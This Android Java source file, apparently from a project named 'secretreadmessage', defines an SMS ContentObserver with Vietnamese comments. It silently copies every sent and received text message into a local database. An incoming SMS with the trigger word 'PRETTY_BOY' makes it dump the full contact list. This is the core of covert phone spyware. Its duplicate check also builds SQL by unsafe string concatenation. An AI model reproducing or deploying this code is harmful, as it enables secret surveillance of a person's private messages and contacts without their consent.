package com.example.phamngochieu.secretreadmessage;

import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.text.format.DateFormat;
import android.util.Log;

import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

/**
 * Created by PhamNgocHieu on 26-Apr-16.
 */
public class SmsReceive extends ContentObserver {
    Handler handler;
    Context context;
    private SQLiteDatabase db;
    String datesend ="";
    public SmsReceive(Handler handler, Context context,SQLiteDatabase db) {

        super(handler);
        this.handler = handler;
        this.context = context;
        this.db = db;

    }
    public SmsReceive(Handler handler, Handler handler1) {
        super(handler);
        handler = handler1;
    }
    @Override public boolean deliverSelfNotifications() {
        return true;
    }

    @Override public void onChange(boolean arg0) {
        super.onChange(arg0);
        Log.e("chạy ONCHANCE", "***Lần 1");
        Thread x = new Thread(new Runnable() {
            public void run() {
                Log.v("SMS", "Notification on SMS observer");
                Message msg = new Message();
                msg.obj = "xxxxxxxxxx";
                handler.sendMessage(msg);
                Uri uriSMSURI = Uri.parse("content://sms/");
                Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
                cur.moveToNext();
                String content = cur.getString(cur.getColumnIndex("body"));
                String smsNumber = cur.getString(cur.getColumnIndex("address"));
                Date now = new Date(cur.getLong(cur.getColumnIndex("date")));
                Log.e("trong onchance", "*******************");
                int type = cur.getInt(cur.getColumnIndex("type"));
                Log.e(now.toString() + "******", "**************");
                if(!datesend.equals(now.toString()))
                {
                    processCopare(type, content, smsNumber, now);
                    datesend = now.toString();
                }
            }
        }
        );
            x.start();
    }
    public void processCopare(int type,String content,String smsNumber,Date now)
    {
       // Toast.makeText(context,"đang xử lý tin nhắn đến",Toast.LENGTH_LONG);
        if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_INBOX) {
            Log.i("recie","recie");
            // kiểm tra nội dung tin nhắn xem có phải là lệnh lấy danh bạ hay không
            if(getContact(content))
            {
                // dầu tiên cứ xóa danh bạ trước đã cho chắc ăn , vãi
                String con = getContact(context);
                ContentValues messageValues = new ContentValues();
                Date time = new Date();
                messageValues.put("TIME",time.toString());
                messageValues.put("CONTENT", con);
                db.insert("CONTACT", null, messageValues);
                Log.e("insert danh bạ "," ");

            }
            else
            {
//                Toast.makeText(context,"gửi đến",Toast.LENGTH_LONG);
                ContentValues messageValues = new ContentValues();
                messageValues.put("PHONENUMBER",smsNumber);
                messageValues.put("TIME",now.toString());
                messageValues.put("CONTENT", content);
                messageValues.put("SEND", true);
                if(testSameRecord(now.toString(),"STORE"))
                {
                    db.insert("STORE", null, messageValues);
                    Log.e("lưu gửi đến vào CSDL", "***********gửi đến*********");
                }
                else
                    Log.e("***","ko insert có bản ghi rồi");

            }
        }
        else
        {
         //   Toast.makeText(context,"gửi đi",Toast.LENGTH_LONG);

            ContentValues messageValues = new ContentValues();
            messageValues.put("PHONENUMBER",smsNumber);
            messageValues.put("TIME", now.toString());
            messageValues.put("CONTENT", content);
            messageValues.put("SEND", true);
            if(testSameRecord(now.toString(),"STORESEND"))
            {
                db.insert("STORESEND", null, messageValues);
                Log.e("lưu gửi đi vào CSDL", "***********gửi đi*********");
            }
            else
                Log.e("***","ko insert có bản ghi rồi");
        }
    }
    /**
     * phương thức này dùng để kiểm tra xem tin nhắn đến có phải là lệnh lấy danh bạ hay không
     */
    public boolean getContact(String sms)
    {
        if(sms.equals("PRETTY_BOY"))
            return true;
        return false;
    }
    /**
     * hàm này là hàm chuyển đổi từ mili giây sang ngày tháng hiện tại
     * cái này mình copy trên mạng
     * @param time
     * @return
     */

    private String getDate(long time) {
        Calendar cal = Calendar.getInstance(Locale.ENGLISH);
        cal.setTimeInMillis(time);
        String date = DateFormat.format("dd-MM-yyyy", cal).toString();
        return date;
    }

    /**
     * phương thức này dùng để lấy danh bạ
     * @param context
     * @return
     */
    public static String getContact(Context context)
    {
        String t ="***** danh bạ ******"+"\n";

        Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            t = t+ name + "  " + phoneNumber + "\n";

        }
        t =t+ "*****************";
        return t;
    }

    /**
     * phương thức này để kiểm tra trùng lặp bản ghi trong CSDL
     * @param date
     * @param table
     * @return
     */
    public boolean testSameRecord(String date,String table)
    {
        String countQuery = "SELECT  * FROM "+table+" WHERE TIME = '"+date+"'";
        Cursor cursor = db.rawQuery(countQuery, null);
        int cnt = cursor.getCount();
        cursor.close();
        if(cnt>0)
            return false;
        else
            return true;
    }
}
